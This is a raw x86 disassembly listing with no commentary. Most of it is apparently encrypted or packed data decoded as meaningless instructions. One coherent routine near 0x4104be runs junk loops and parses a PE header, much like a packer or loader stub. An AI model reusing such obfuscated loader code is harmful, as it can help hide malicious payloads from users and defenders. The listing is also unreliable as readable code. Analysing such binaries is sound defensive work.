  41000d:	not    DWORD PTR ds:0x3ff97905
  410013:	inc    ebx
  410014:	jmp    0xe43de64d
  410019:	add    DWORD PTR [ecx],ebp
  41001b:	mov    al,ds:0xb6e7b59e
  410020:	dec    ecx
  410021:	push   ds
  410022:	cmc    
  410023:	pop    edi
  410024:	(bad)  [edi]
  410026:	push   esi
  410027:	xor    eax,0xbaa2216a
  41002c:	sbb    eax,0x501d374c
  410031:	mov    al,0x43
  410033:	cmc    
  410034:	xchg   edx,eax
  410035:	out    dx,eax
  410036:	rol    BYTE PTR [esi],cl
  410038:	fnstsw WORD PTR [ebx]
  41003a:	fidivr DWORD PTR [esi]
  41003c:	add    BYTE PTR [edx+0x7b],cl
  41003f:	fnstcw WORD PTR [ebx+0x59]
  410042:	mov    edx,edi
  410044:	lahf   
  410045:	push   0xd09c20ef
  41004a:	imul   eax,esp,0xffffff97
  41004d:	addr16 out dx,eax
  41004f:	add    al,0x8f
  410051:	xchg   esp,eax
  410052:	bound  esi,QWORD PTR [edx+ebx*8+0x27]
  410056:	push   cs
  410057:	sbb    esp,DWORD PTR [eax+0x4e8a7a2f]
  41005d:	add    eax,0x28e1ed67
  410062:	cmp    dh,BYTE PTR [esi+0x74]
  410065:	jno    0x4100b8
  410067:	es push es
  410069:	inc    eax
  41006a:	push   edx
  41006b:	cld    
  41006c:	pop    esp
  41006d:	fstsw  ax
  410070:	lds    ecx,FWORD PTR [ecx-0x37]
  410073:	and    al,0x65
  410075:	xchg   esi,eax
  410076:	pop    ecx
  410077:	push   ecx
  410078:	stos   DWORD PTR es:[edi],eax
  410079:	mov    gs,WORD PTR ds:0x34883cf
  41007f:	inc    esp
  410080:	sbb    eax,0xbd4cd6fc
  410085:	and    ebp,edx
  410087:	sahf   
  410088:	xchg   edi,eax
  410089:	mov    ebp,0x6d03059b
  41008e:	xlat   BYTE PTR ds:[ebx]
  41008f:	push   ds
  410090:	test   DWORD PTR [ebx-0x2a],esi
  410093:	ret    0xfea6
  410096:	jge    0x410084
  410098:	sub    ebp,ecx
  41009a:	fild   DWORD PTR [ecx-0x44]
  41009d:	jge    0x41004b
  41009f:	xchg   ecx,eax
  4100a0:	mov    esi,0x4a69ec29
  4100a5:	ret    0xad68
  4100a8:	or     eax,0x9a3e650f
  4100ad:	inc    edx
  4100ae:	repnz das 
  4100b0:	js     0x410107
  4100b2:	aaa    
  4100b3:	mov    eax,0xf07a7071
  4100b8:	jae    0x4100c0
  4100ba:	or     BYTE PTR [edi-0x80],bh
  4100bd:	cmp    ch,BYTE PTR [ebp-0x68ccb2d3]
  4100c3:	add    BYTE PTR [edx+ebx*2+0x3d7a6c3a],dl
  4100ca:	mov    ah,0xdc
  4100cc:	popa   
  4100cd:	popa   
  4100ce:	cwde   
  4100cf:	bound  eax,QWORD PTR [edi-0x77]
  4100d2:	inc    esp
  4100d3:	(bad)  
  4100d4:	adc    edx,eax
  4100d6:	xor    esp,eax
  4100d8:	push   ebx
  4100d9:	mov    esp,0xfb73232a
  4100de:	(bad)  
  4100df:	and    esi,edi
  4100e1:	push   ds
  4100e2:	push   edx
  4100e3:	xor    al,0x22
  4100e5:	pop    ds
  4100e6:	int3   
  4100e7:	and    BYTE PTR [esi+0x62df066e],bh
  4100ed:	and    eax,0x1ab3c3de
  4100f2:	inc    esi
  4100f3:	xchg   edx,eax
  4100f4:	aaa    
  4100f5:	xchg   esi,eax
  4100f6:	sti    
  4100f7:	add    eax,0xf104b7f
  4100fc:	xchg   edx,eax
  4100fd:	and    al,0x55
  4100ff:	test   DWORD PTR [ebx+0x48],ebx
  410102:	inc    ecx
  410103:	scas   eax,DWORD PTR es:[edi]
  410104:	ja     0x410167
  410106:	nop
  410107:	sbb    esi,DWORD PTR [ebx]
  410109:	fdivr  QWORD PTR [ebp+0x26335d4c]
  41010f:	cs jle 0x4100e4
  410112:	retf   
  410113:	adc    bl,BYTE PTR [esi]
  410115:	mov    esi,0x1799e245
  41011a:	fmulp  st(2),st
  41011c:	das    
  41011d:	mov    ch,0x8b
  41011f:	inc    ebp
  410120:	cld    
  410121:	xor    eax,edi
  410123:	pop    edi
  410124:	jmp    0x4104b7
  410129:	push   ecx
  41012a:	clc    
  41012b:	clc    
  41012c:	mov    ebx,0x9c5dbb51
  410131:	test   BYTE PTR [edi-0x56],dh
  410134:	adc    DWORD PTR [ecx],esp
  410136:	test   eax,0x4478df25
  41013b:	jle    0x4101bb
  41013d:	hlt    
  41013e:	jns    0x4101be
  410140:	jle    0x410118
  410142:	jge    0x4101b7
  410144:	xor    dl,BYTE PTR [esi-0x57]
  410147:	call   0xef9c:0x555d6220
  41014e:	aam    0x47
  410150:	mov    esp,0x6002764a
  410155:	retf   0xfa71
  410158:	pop    edi
  410159:	jp     0x410153
  41015b:	test   DWORD PTR [edi+ebp*2],esi
  41015e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41015f:	pop    esp
  410160:	loop   0x410102
  410162:	loopne 0x4101c0
  410164:	sub    DWORD PTR [edi+0x5d5fe2fe],0xffffffcf
  41016b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41016c:	jg     0x4100fc
  41016e:	push   0xffffffc4
  410170:	cs out dx,eax
  410172:	dec    edi
  410173:	or     dl,bh
  410175:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410176:	out    dx,al
  410177:	push   0xffffffe5
  410179:	adc    ah,BYTE PTR [ecx-0x756de352]
  41017f:	sub    al,BYTE PTR [ebp+0x65]
  410182:	xchg   esp,eax
  410183:	or     al,0xe4
  410185:	mov    DWORD PTR [esi-0x308e27b5],ebp
  41018b:	mov    esp,0x5c9938e0
  410190:	jbe    0x41020a
  410192:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410193:	sbb    BYTE PTR [ecx+0x29c3a3da],0xce
  41019a:	jg     0x4101b4
  41019c:	cmp    DWORD PTR [ebx-0x14a6c8b],eax
  4101a2:	adc    BYTE PTR [ebx],ch
  4101a4:	add    DWORD PTR es:[eax],edx
  4101a7:	int    0xb7
  4101a9:	aam    0xdf
  4101ab:	lahf   
  4101ac:	inc    esp
  4101ad:	xor    cl,0x9a
  4101b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101b1:	sub    al,0xca
  4101b3:	(bad)  
  4101b4:	cdq    
  4101b5:	dec    ecx
  4101b6:	aaa    
  4101b7:	daa    
  4101b8:	(bad)  
  4101b9:	in     al,dx
  4101ba:	mov    BYTE PTR [edx],ah
  4101bc:	nop
  4101bd:	int3   
  4101be:	sti    
  4101bf:	cwde   
  4101c0:	pop    ebp
  4101c1:	mov    esp,0x97dd88ec
  4101c6:	lods   eax,DWORD PTR ds:[esi]
  4101c7:	ret    
  4101c8:	leave  
  4101c9:	xchg   ecx,eax
  4101ca:	in     eax,dx
  4101cb:	pop    ebx
  4101cc:	xor    BYTE PTR [esp+edi*8+0x57],bh
  4101d0:	je     0x41017c
  4101d2:	fbstp  TBYTE PTR [esi+0x4]
  4101d5:	jb     0x410212
  4101d7:	fwait
  4101d8:	jne    0x41019f
  4101da:	ret    0x805b
  4101dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101de:	icebp  
  4101df:	adc    BYTE PTR [edi+0xc],ch
  4101e2:	loop   0x410186
  4101e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101e5:	jl     0x410223
  4101e7:	lea    ebx,[edx]
  4101e9:	fst    QWORD PTR [esi]
  4101eb:	mov    dh,ch
  4101ed:	(bad)  
  4101ee:	arpl   WORD PTR [eax],sp
  4101f0:	mov    ebp,0xe29c426d
  4101f5:	sti    
  4101f6:	cmp    DWORD PTR [ebp+0x40],ecx
  4101f9:	ret    0x851f
  4101fc:	sti    
  4101fd:	sbb    esp,DWORD PTR [bp+0x1b65]
  410202:	sub    edx,DWORD PTR [esi-0x244246c3]
  410208:	pushf  
  410209:	adc    ah,BYTE PTR [edx-0x2d]
  41020c:	jecxz  0x41020f
  41020e:	scas   eax,DWORD PTR es:[edi]
  41020f:	or     al,BYTE PTR cs:[esi]
  410212:	out    dx,eax
  410213:	mov    ds:0x3c268962,al
  410218:	out    0xe6,al
  41021a:	mov    ds:0x8f2efbe4,al
  41021f:	mov    ch,0x8
  410221:	adc    BYTE PTR [ebx-0x49699a60],ah
  410227:	imul   esp,eax,0x232b26d5
  41022d:	(bad)  
  41022e:	push   edx
  41022f:	add    ecx,DWORD PTR [ebx+ebx*1]
  410232:	cmp    DWORD PTR [ecx-0x20],esi
  410235:	into   
  410236:	idiv   BYTE PTR [ecx-0xa]
  410239:	std    
  41023a:	adc    bl,BYTE PTR [edx]
  41023c:	jns    0x4101d4
  41023e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41023f:	cmp    BYTE PTR [ecx-0x3203f0b6],bl
  410245:	dec    edi
  410246:	xor    bh,al
  410248:	int    0x46
  41024a:	fild   WORD PTR [ebx-0x623913b3]
  410250:	test   DWORD PTR [ecx-0x4e361bf4],0xcb859f29
  41025a:	mov    WORD PTR [edi-0x2],ss
  41025d:	jle    0x410215
  41025f:	mov    edi,0x9631c217
  410264:	sbb    bh,BYTE PTR [edi-0x5f]
  410267:	add    al,0xb1
  410269:	dec    ebx
  41026a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41026b:	(bad)  
  41026c:	adc    DWORD PTR [edi+0x16094a5d],ebp
  410272:	nop
  410273:	cwde   
  410274:	inc    edx
  410275:	add    BYTE PTR [edi+0x61],dh
  410278:	les    esi,FWORD PTR [esi+ecx*1+0x3]
  41027c:	pop    ss
  41027d:	pop    edi
  41027e:	sbb    eax,ebx
  410280:	dec    ebx
  410281:	dec    esi
  410282:	jle    0x4102d0
  410284:	shl    DWORD PTR [esi],1
  410286:	out    0x3,eax
  410288:	mov    edx,0xd1f2726
  41028d:	js     0x410249
  41028f:	lea    esp,[ecx]
  410291:	mov    DWORD PTR [eax-0x79],eax
  410294:	inc    BYTE PTR [edx+0xd]
  410297:	mov    dl,0x84
  410299:	das    
  41029a:	cmc    
  41029b:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41029d:	add    ah,ch
  41029f:	mov    bh,0x2a
  4102a1:	fdivp  st(3),st
  4102a3:	aas    
  4102a4:	and    edx,DWORD PTR [ecx]
  4102a6:	or     al,0xb5
  4102a8:	stc    
  4102a9:	leave  
  4102aa:	shl    BYTE PTR [esi],0x34
  4102ad:	cmp    eax,0xca1c21da
  4102b2:	or     al,BYTE PTR es:[edi+esi*2+0x4035e2eb]
  4102ba:	or     eax,0x14dc0f40
  4102bf:	push   ecx
  4102c0:	ffreep st(0)
  4102c2:	or     al,0xc0
  4102c4:	outs   dx,DWORD PTR ds:[esi]
  4102c5:	das    
  4102c6:	inc    edi
  4102c7:	xchg   ebp,eax
  4102c8:	or     ebp,DWORD PTR [eax-0x5e]
  4102cb:	mov    ds:0xaa86108a,eax
  4102d0:	out    0x62,al
  4102d2:	dec    edi
  4102d3:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102d5:	add    eax,DWORD PTR [ebp+0x58]
  4102d8:	lods   eax,DWORD PTR ds:[esi]
  4102d9:	hlt    
  4102da:	push   ecx
  4102db:	lahf   
  4102dc:	adc    al,BYTE PTR [ebx+0x721b4c66]
  4102e2:	mov    ah,0xde
  4102e4:	out    0x57,eax
  4102e6:	popf   
  4102e7:	mov    eax,0xdfdecf56
  4102ec:	in     al,dx
  4102ed:	shl    ch,1
  4102ef:	pop    es
  4102f0:	jnp    0x4102f3
  4102f2:	add    DWORD PTR [edi+0x73138718],ecx
  4102f8:	adc    BYTE PTR [edx+0x4c],ch
  4102fb:	rcr    DWORD PTR [edx+edi*1+0x77],1
  4102ff:	lods   eax,DWORD PTR ds:[esi]
  410300:	cdq    
  410301:	pop    eax
  410302:	xchg   edx,eax
  410303:	or     BYTE PTR [edi+ebx*8],0xfa
  410307:	mov    eax,ds:0x7c71cf75
  41030c:	push   edi
  41030d:	push   cs
  41030e:	mov    fs,WORD PTR [eax]
  410310:	out    dx,eax
  410311:	fld    st(4)
  410313:	xor    al,0x9c
  410315:	cmp    BYTE PTR [ebp-0x19],bh
  410318:	mov    ch,0xce
  41031a:	sbb    eax,0xc039eaea
  41031f:	mov    ebx,0x76b19720
  410324:	les    edi,FWORD PTR [ecx-0x49]
  410327:	aas    
  410328:	adc    eax,0x42e21861
  41032d:	xchg   esp,eax
  41032e:	xchg   edx,eax
  41032f:	mov    dl,0x92
  410331:	add    DWORD PTR [esi-0x5c210463],edx
  410337:	fisttp DWORD PTR [ecx+0x1423e0e]
  41033d:	mov    DWORD PTR [eax+ecx*8+0x4e],esi
  410341:	xlat   BYTE PTR ds:[ebx]
  410342:	push   0x42c88557
  410347:	les    esi,FWORD PTR [esi-0x2569d59a]
  41034d:	inc    ebp
  41034e:	aad    0x7
  410350:	or     bl,BYTE PTR [esi+0x9]
  410353:	pop    esi
  410354:	imul   esp,DWORD PTR [esi-0x2b5beb59],0xffffffe5
  41035b:	cs loopne 0x41036c
  41035e:	mov    eax,ds:0x22d0d72f
  410363:	xchg   ebp,eax
  410364:	outs   dx,BYTE PTR ds:[esi]
  410365:	mov    dl,0x73
  410367:	cmp    bl,dl
  410369:	mov    edx,ecx
  41036b:	push   ebx
  41036c:	lock push ds
  41036e:	repnz sub dh,BYTE PTR [esi+0x9]
  410372:	iret   
  410373:	or     eax,DWORD PTR ds:0x88b8f7d0
  410379:	push   eax
  41037a:	or     edi,DWORD PTR [ecx]
  41037c:	aad    0x50
  41037e:	jo     0x410328
  410380:	dec    ecx
  410381:	xchg   edx,eax
  410382:	shl    ebx,cl
  410384:	aas    
  410385:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410386:	into   
  410387:	push   ebp
  410388:	sbb    al,BYTE PTR [ebx+0x19]
  41038b:	jmp    DWORD PTR [ecx-0x32c17d38]
  410391:	out    dx,al
  410392:	test   BYTE PTR [edi],dh
  410394:	cli    
  410395:	adc    eax,0xbb474517
  41039a:	(bad)  
  41039b:	adc    al,0xb7
  41039d:	lds    esi,FWORD PTR [ecx]
  41039f:	inc    eax
  4103a0:	dec    ebp
  4103a1:	fdiv   st(6),st
  4103a3:	cld    
  4103a4:	ret    0x33f5
  4103a7:	or     dh,0xd5
  4103aa:	or     eax,0x21d794a0
  4103af:	test   eax,0xdc59b4b
  4103b4:	xchg   edi,eax
  4103b5:	scas   al,BYTE PTR es:[edi]
  4103b6:	inc    edi
  4103b7:	cdq    
  4103b8:	lds    esp,FWORD PTR [eax+eiz*1-0x51]
  4103bc:	sbb    edx,DWORD PTR [ebx+0x1742527]
  4103c2:	mov    cl,0x4f
  4103c4:	add    eax,0xee3f5eff
  4103c9:	pop    es
  4103ca:	pop    ds
  4103cb:	mov    edx,0xbb545c90
  4103d0:	aaa    
  4103d1:	stc    
  4103d2:	inc    esp
  4103d3:	adc    eax,0x297c26c6
  4103d8:	fist   DWORD PTR [eax-0x72e4f395]
  4103de:	dec    ebp
  4103df:	and    edi,esi
  4103e1:	fsub   st,st(5)
  4103e3:	mov    al,ds:0x26aca326
  4103e8:	push   esp
  4103e9:	nop
  4103ea:	dec    esi
  4103eb:	rcr    BYTE PTR [edi],0x13
  4103ee:	adc    DWORD PTR [edi],0x1e3b9889
  4103f4:	sbb    al,0x51
  4103f6:	pushf  
  4103f7:	aad    0x4f
  4103f9:	jns    0x4103bf
  4103fb:	ret    
  4103fc:	jno    0x41047a
  4103fe:	ins    BYTE PTR es:[edi],dx
  4103ff:	fild   DWORD PTR [edx+ebx*1-0x16]
  410403:	push   ebp
  410404:	mov    ds:0xa295576,al
  410409:	stos   BYTE PTR es:[edi],al
  41040a:	xchg   edi,eax
  41040b:	push   ecx
  41040c:	jmp    0x731b:0x7049e142
  410413:	push   ebp
  410414:	push   edx
  410415:	jp     0x4103e4
  410417:	pop    ds
  410418:	sbb    edi,DWORD PTR [esi]
  41041a:	mov    BYTE PTR [edx+0x55c1615d],bh
  410420:	jmp    0xcaeea412
  410425:	mov    esi,0xc5813c38
  41042a:	xchg   ebp,eax
  41042b:	in     al,0xa3
  41042d:	push   edx
  41042e:	aas    
  41042f:	jno    0x41048c
  410431:	out    0x51,al
  410433:	ror    DWORD PTR ds:0x5707aa7f,cl
  410439:	mov    ds:0xbc7c9535,eax
  41043e:	push   es
  41043f:	mov    ds:0x5ba82f1,eax
  410444:	mov    cl,0xd8
  410446:	sub    esi,ecx
  410448:	retf   0xec0b
  41044b:	inc    esp
  41044c:	sahf   
  41044d:	inc    ebp
  41044e:	lods   al,BYTE PTR ds:[esi]
  41044f:	ins    DWORD PTR es:[edi],dx
  410450:	(bad)  
  410451:	les    eax,FWORD PTR [eax+0x1487023e]
  410457:	mov    ebp,0x85a812b8
  41045c:	ror    BYTE PTR [esi],0x89
  41045f:	cmp    al,ah
  410461:	xchg   DWORD PTR [ebx+0x6cee502b],ebp
  410467:	shl    DWORD PTR [ecx],cl
  410469:	call   0xb59931b7
  41046e:	pushf  
  41046f:	mov    eax,0x6db0990b
  410474:	test   eax,0x17674aea
  410479:	sti    
  41047a:	or     dl,BYTE PTR [esi+0x63]
  41047d:	push   eax
  41047e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41047f:	xor    DWORD PTR [edi+0x2f01e591],eax
  410485:	xchg   edi,eax
  410486:	(bad)  
  410487:	retf   0xb58e
  41048a:	cli    
  41048b:	or     BYTE PTR [ebp-0x61e703b0],ah
  410491:	xchg   edi,eax
  410492:	aaa    
  410493:	call   0xdecbce23
  410498:	aas    
  410499:	xchg   edx,eax
  41049a:	xor    al,0xb1
  41049c:	sub    al,0xf7
  41049e:	ficom  DWORD PTR [ebp-0x5bb73eee]
  4104a4:	rol    DWORD PTR [ebx-0x15],1
  4104a7:	stc    
  4104a8:	pop    eax
  4104a9:	fnstenv [edi+0x27]
  4104ac:	fs in  eax,dx
  4104ae:	xor    dh,BYTE PTR [ecx-0x5798e536]
  4104b4:	mov    ch,0xad
  4104b6:	out    dx,al
  4104b7:	add    eax,esi
  4104b9:	pop    esi
  4104ba:	leave  
  4104bb:	ret    0xc
  4104be:	push   ebp
  4104bf:	mov    ebp,esp
  4104c1:	push   ecx
  4104c2:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  4104c9:	mov    DWORD PTR ds:0x434577,0x1f
  4104d3:	cmp    DWORD PTR ds:0x434577,0x0
  4104da:	je     0x410527
  4104e0:	cmp    DWORD PTR ds:0x434577,0x10
  4104e7:	jne    0x4104f6
  4104ed:	push   DWORD PTR [ebp-0x28]
  4104f0:	call   DWORD PTR ds:0x41335c
  4104f6:	cmp    DWORD PTR ds:0x434577,0x11
  4104fd:	jne    0x41050e
  410503:	mov    eax,ds:0x434577
  410508:	dec    eax
  410509:	mov    ds:0x434577,eax
  41050e:	xor    eax,eax
  410510:	add    eax,DWORD PTR ds:0x434577
  410516:	dec    eax
  410517:	mov    ds:0x434577,eax
  41051c:	jmp    0x4104d3
  410521:	xor    DWORD PTR ds:0x4345c7,ebx
  410527:	mov    eax,DWORD PTR [ebp+0x8]
  41052a:	and    DWORD PTR ds:0x43460f,0x434693
  410534:	mov    al,BYTE PTR [eax]
  410536:	add    al,0x3a
  410538:	xor    al,0x44
  41053a:	cmp    al,0xc3
  41053c:	mov    DWORD PTR ds:0x4345cf,0x7f5c
  410546:	jne    0x410979
  41054c:	and    edx,DWORD PTR ds:0x434607
  410552:	mov    eax,DWORD PTR [ebp+0x8]
  410555:	and    DWORD PTR ds:0x43456b,0x0
  41055f:	jmp    0x410571
  410564:	mov    edx,DWORD PTR ds:0x43456b
  41056a:	inc    edx
  41056b:	mov    DWORD PTR ds:0x43456b,edx
  410571:	cmp    DWORD PTR ds:0x43456b,0x1c
  410578:	jae    0x4105c7
  41057e:	cmp    DWORD PTR ds:0x43456b,0xc
  410585:	jne    0x4105a6
  41058b:	push   0x1ce2
  410590:	push   DWORD PTR [ebp-0x24]
  410593:	push   0x6804
  410598:	push   DWORD PTR [ebp-0x18]
  41059b:	push   0x869f
  4105a0:	call   DWORD PTR ds:0x4130d4
  4105a6:	cmp    DWORD PTR ds:0x43456b,0xb
  4105ad:	jne    0x4105c2
  4105b3:	xor    edx,edx
  4105b5:	or     edx,DWORD PTR ds:0x43456b
  4105bb:	inc    edx
  4105bc:	mov    DWORD PTR ds:0x43456b,edx
  4105c2:	jmp    0x410564
  4105c7:	mov    ecx,DWORD PTR [ebp+0x8]
  4105ca:	add    ecx,DWORD PTR [eax+0x3c]
  4105cd:	mov    edx,0x7510851
  4105d2:	mov    DWORD PTR [ebp+0x8],ecx
  4105d5:	mov    eax,DWORD PTR [ebp-0x4]
  4105d8:	xor    eax,edx
  4105da:	push   esi
  4105db:	jmp    0x410796
  4105e0:	mov    ebp,0x6da24588
  4105e5:	jae    0x410664
  4105e7:	mov    DWORD PTR [eax],ecx
  4105e9:	sub    esi,DWORD PTR [esi+ecx*2]
  4105ec:	loope  0x4105d9
  4105ee:	inc    ecx
  4105ef:	mov    cl,0xf6
  4105f1:	inc    edi
  4105f2:	jle    0x410672
  4105f4:	pushf  
  4105f5:	jg     0x410675
  4105f7:	jle    0x41065d
  4105f9:	xlat   BYTE PTR ds:[ebx]
  4105fa:	jp     0x410610
  4105fc:	(bad)  
  4105fd:	out    0xcb,eax
  4105ff:	sti    
  410600:	add    dh,dl
  410602:	or     ah,0x49
  410605:	add    esp,DWORD PTR [eax+0x417f3be1]
  41060b:	mov    bh,0x4a
  41060d:	xor    al,0x6
  41060f:	mov    DWORD PTR [si],esp
  410612:	push   0xffffffb5
  410614:	pop    eax
  410615:	mov    ch,0xfd
  410617:	add    ch,ch
  410619:	and    eax,0x56e62b5e
  41061e:	iret   
  41061f:	lea    eax,[esp+esi*8]
  410622:	(bad)  
  410623:	pop    ebp
  410624:	mov    ?,WORD PTR [edi+0x38e42179]
  41062a:	dec    eax
  41062b:	ret    
  41062c:	sti    
  41062d:	enter  0xdf2b,0x77
  410631:	lods   al,BYTE PTR ds:[esi]
  410632:	mov    al,0xc7
  410634:	adc    BYTE PTR [esi+0x4f],ah
  410637:	aam    0x36
  410639:	(bad)  
  41063a:	adc    eax,0x36047917
  41063f:	test   DWORD PTR [edx-0x20aea35e],0x39b9677
  410649:	push   ebp
  41064a:	sbb    eax,0xa5f81ab0
  41064f:	mov    al,0xba
  410651:	xchg   esi,eax
  410652:	inc    DWORD PTR [eax+0x50]
  410655:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410656:	jmp    0x410605
  410658:	push   0xffffffd2
  41065a:	(bad)  
  41065b:	xor    DWORD PTR [eax],edi
  41065d:	pop    ds
  41065e:	cmp    esi,DWORD PTR ds:0x61336b3f
  410664:	(bad)  
  410666:	in     eax,dx
  410667:	cs dec ebx
  410669:	or     al,0x5d
  41066b:	out    0x2c,al
  41066d:	dec    esi
  41066e:	sbb    esi,DWORD PTR [edx+0x4681001b]
  410674:	cld    
  410675:	sub    ah,BYTE PTR [eax+0x49]
  410678:	gs out 0xfd,eax
  41067b:	imul   ecx,DWORD PTR [ebp+0x10],0x66
  41067f:	lds    esp,FWORD PTR cs:[ebx]
  410682:	(bad)  
  410684:	fsub   DWORD PTR [edx-0x633e5f59]
  41068a:	imul   ecx,DWORD PTR [ecx-0x3f],0x4c
  41068e:	xchg   edi,eax
  41068f:	enter  0x1950,0xf1
  410693:	ins    DWORD PTR es:[edi],dx
  410694:	cmp    esi,DWORD PTR [edi-0x5f461b5c]
  41069a:	cld    
  41069b:	cli    
  41069c:	pop    ecx
  41069d:	rcr    BYTE PTR ds:[ebx],0xfc
  4106a1:	or     BYTE PTR [eax-0x175e334c],ah
  4106a7:	add    BYTE PTR [ebp-0x16],ah
  4106aa:	adc    bh,BYTE PTR [edi+eax*2]
  4106ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106ae:	std    
  4106af:	xor    esp,0x2ac2009
  4106b5:	aas    
  4106b6:	mov    eax,0x53391aa9
  4106bb:	fstp   st(2)
  4106bd:	popa   
  4106be:	ficomp DWORD PTR [ecx-0x4ebba1a3]
  4106c4:	jl     0x410723
  4106c6:	and    DWORD PTR [ecx],esp
  4106c8:	fwait
  4106c9:	push   ss
  4106ca:	in     al,0x1c
  4106cc:	(bad)  
  4106cd:	ins    BYTE PTR es:[edi],dx
  4106ce:	and    ch,BYTE PTR [eax]
  4106d0:	xor    bh,dl
  4106d2:	mov    al,0x39
  4106d4:	xor    BYTE PTR [edi+0x62ab7160],dh
  4106da:	call   0x13a:0xd9046e46
  4106e1:	mov    ch,0x19
  4106e3:	xchg   ecx,eax
  4106e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106e5:	inc    esi
  4106e6:	in     al,dx
  4106e7:	inc    eax
  4106e8:	in     al,dx
  4106e9:	dec    ebx
  4106ea:	mov    eax,ds:0x4554c95b
  4106ef:	(bad)  
  4106f0:	fldcw  WORD PTR [ebp-0x3a567914]
  4106f6:	fwait
  4106f7:	mov    ebx,0xd8a78208
  4106fc:	adc    al,0x48
  4106fe:	sbb    ebx,DWORD PTR [eax+0x18]
  410701:	pop    ecx
  410702:	add    esp,DWORD PTR [edi+esi*8]
  410705:	cmp    esi,DWORD PTR [edx]
  410707:	hlt    
  410708:	daa    
  410709:	int    0x18
  41070b:	mov    ah,0x7f
  41070d:	or     ebx,ecx
  41070f:	jnp    0x4106cd
  410711:	or     BYTE PTR [edx-0x5a499c4c],bh
  410717:	repz or al,0x38
  41071a:	fbld   TBYTE PTR [ebx+0x4ceb4b28]
  410720:	push   ebx
  410721:	jbe    0x410734
  410723:	iret   
  410724:	mov    eax,edi
  410726:	ja     0x410726
  410728:	scas   eax,DWORD PTR es:[edi]
  410729:	jno    0x410753
  41072b:	and    al,0x72
  41072d:	mov    edi,0xbb5f7d1e
  410732:	inc    edx
  410733:	pop    esp
  410734:	rol    edx,0xe8
  410737:	pusha  
  410738:	and    BYTE PTR [ebp-0x39],dh
  41073b:	fisub  WORD PTR [ebx]
  41073d:	clc    
  41073e:	jmp    0x33d7:0xbc6d281f
  410745:	out    dx,al
  410746:	sub    al,0x64
  410748:	sti    
  410749:	push   esi
  41074a:	into   
  41074b:	and    DWORD PTR [esi+0x1b],esp
  41074e:	xchg   BYTE PTR [esi-0x51],bl
  410751:	adc    eax,0xa9092fbe
  410756:	mov    esi,0x4bb76850
  41075b:	xor    al,0xa6
  41075d:	js     0x410773
  41075f:	neg    DWORD PTR [ecx-0x74062c58]
  410765:	add    al,0x24
  410767:	jbe    0x4107ba
  410769:	xchg   edx,eax
  41076a:	mov    WORD PTR [esi-0x31d89772],fs
  410770:	pop    ebx
  410771:	inc    esp
  410772:	add    eax,0xe4756ac8
  410777:	js     0x4107c9
  410779:	mov    bl,0xe3
  41077b:	push   ebp
  41077c:	dec    ebp
  41077d:	lods   eax,DWORD PTR ds:[esi]
  41077e:	pop    ebx
  41077f:	sub    edx,0x220390ad
  410785:	or     ch,BYTE PTR [esi+0x238b66b1]
  41078b:	inc    edx
  41078c:	inc    eax
  41078d:	aas    
  41078e:	inc    edx
  41078f:	sti    
  410790:	aaa    
  410791:	cmp    DWORD PTR [eax+0x24],0xffffffda
  410795:	xchg   edx,eax
  410796:	mov    esi,DWORD PTR [ebp+0x8]
  410799:	mov    ecx,0x327299
  41079e:	jmp    0x410959
  4107a3:	cmc    
  4107a4:	mov    al,BYTE PTR [esi+ecx*8+0x65]
  4107a8:	enter  0xb575,0x7e
  4107ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107ad:	mov    dl,0x1f
  4107af:	addr16 jmp 0x41559a18
  4107b5:	jle    0x410835
  4107b7:	pushf  
  4107b8:	jg     0x410838
  4107ba:	jle    0x410815
  4107bc:	push   ebx
  4107bd:	dec    bp
  4107bf:	pop    esp
  4107c0:	inc    ebx
  4107c1:	sti    
  4107c2:	inc    ebx
  4107c3:	xlat   BYTE PTR ds:[ebx]
  4107c4:	(bad)  
  4107c5:	fld    DWORD PTR [ebx+0x7e1ee6c1]
  4107cb:	test   BYTE PTR [ebx*8+0x3e2d1a10],dl
  4107d2:	test   al,0xa5
  4107d4:	sub    al,0x29
  4107d6:	cmp    esi,ebp
  4107d8:	hlt    
  4107d9:	retf   
  4107da:	les    ebx,FWORD PTR [eax]
  4107dc:	add    DWORD PTR [ebx+0x62],eax
  4107df:	mov    DWORD PTR [edx],ecx
  4107e1:	(bad)  
  4107e2:	dec    edi
  4107e3:	loop   0x410835
  4107e5:	je     0x410814
  4107e7:	push   eax
  4107e8:	sub    eax,DWORD PTR cs:[eax+0x61]
  4107ec:	in     eax,0xa0
  4107ee:	(bad)  
  4107ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107f0:	dec    ebp
  4107f1:	into   
  4107f2:	dec    ecx
  4107f3:	(bad)  
  4107f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107f5:	xor    bh,BYTE PTR [ebx+0x24]
  4107f8:	test   eax,0xbbfee45
  4107fd:	imul   edx,ecx,0xe5aaceae
  410803:	adc    eax,0xa9ce7fb8
  410808:	arpl   WORD PTR [eax],si
  41080a:	push   ebx
  41080b:	push   edx
  41080c:	add    eax,DWORD PTR [ebp-0x46]
  41080f:	xor    BYTE PTR [eax+0x7f4b3537],dl
  410815:	adc    al,dl
  410817:	(bad)  
  410818:	sbb    BYTE PTR [edx-0x62],bh
  41081b:	scas   eax,DWORD PTR es:[edi]
  41081c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41081d:	arpl   WORD PTR [ebp-0x7d],bp
  410820:	pop    ds
